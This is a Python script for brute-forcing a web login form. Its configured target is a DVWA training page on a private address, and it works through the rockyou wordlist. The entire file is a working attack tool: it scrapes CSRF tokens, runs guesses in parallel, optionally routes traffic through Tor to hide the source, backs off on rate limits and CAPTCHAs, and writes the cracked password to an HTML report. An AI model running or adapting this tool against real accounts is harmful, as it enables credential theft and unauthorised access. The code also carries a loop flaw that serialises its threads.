import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import time
import sys
import os
from datetime import datetime

# --- Configuration ---
TARGET_URL = "http://192.168.1.100/dvwa/login.php"
USERNAME = "admin"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
FAIL_STRING = "Login failed"
CSRF_FIELD = "user_token"  # Update based on the target form
MAX_WORKERS = 5
USE_TOR = False
LOG_FILE = "bruteforce_log.txt"
REPORT_FILE = "bruteforce_report.html"

# --- Proxy settings ---
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
} if USE_TOR else None

# --- Functions ---
def get_csrf_token(session):
    resp = session.get(TARGET_URL, proxies=proxies)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_tag = soup.find("input", {"name": CSRF_FIELD})
    return token_tag["value"] if token_tag else None

def attempt_login(password):
    session = requests.Session()
    csrf_token = get_csrf_token(session)

    data = {
        "username": USERNAME,
        "password": password.strip(),
        "Login": "Login"
    }

    if csrf_token:
        data[CSRF_FIELD] = csrf_token

    try:
        response = session.post(TARGET_URL, data=data, proxies=proxies, timeout=10)
        if response.status_code == 429:
            log_event("Too many requests - slowing down...")
            time.sleep(10)
        if "captcha" in response.text.lower():
            log_event("CAPTCHA detected - backing off...")
            time.sleep(30)
        if FAIL_STRING not in response.text:
            found = f"Password found: {password.strip()}"
            log_event(found)
            generate_html_report(password.strip())
            return True
    except Exception as e:
        log_event(f"ERROR: {e}")
    return False

def worker(password):
    return attempt_login(password)

def log_event(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = f"[{timestamp}] {message}"
    print(log_line)
    with open(LOG_FILE, "a") as f:
        f.write(log_line + "\n")

def generate_html_report(password):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    html = f"""
    <html>
    <head>
        <title>Bruteforce Report</title>
        <style>
            body {{ font-family: Arial; padding: 20px; background: #f4f4f4; }}
            h1 {{ color: #c0392b; }}
            pre {{ background: #fff; padding: 10px; border: 1px solid #ccc; }}
        </style>
    </head>
    <body>
        <h1>Bruteforce Login Report</h1>
        <p><strong>Target:</strong> {TARGET_URL}</p>
        <p><strong>Username:</strong> {USERNAME}</p>
        <p><strong>Successful Password:</strong> <code>{password}</code></p>
        <p><strong>Time:</strong> {timestamp}</p>
    </body>
    </html>
    """
    with open(REPORT_FILE, "w") as f:
        f.write(html)
    print(f"[+] HTML report saved to {REPORT_FILE}")

def main():
    try:
        with open(WORDLIST, "r", encoding="latin-1") as file:
            passwords = file.readlines()
    except FileNotFoundError:
        log_event(f"Wordlist not found: {WORDLIST}")
        sys.exit(1)

    log_event(f"Starting brute-force on {TARGET_URL} as '{USERNAME}'...")

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for password in passwords:
            future = executor.submit(worker, password)
            futures.append(future)

            # Stop if password is found
            if future.result():
                executor.shutdown(wait=False)
                break

    log_event("Brute-force complete.")

if __name__ == "__main__":
    main()
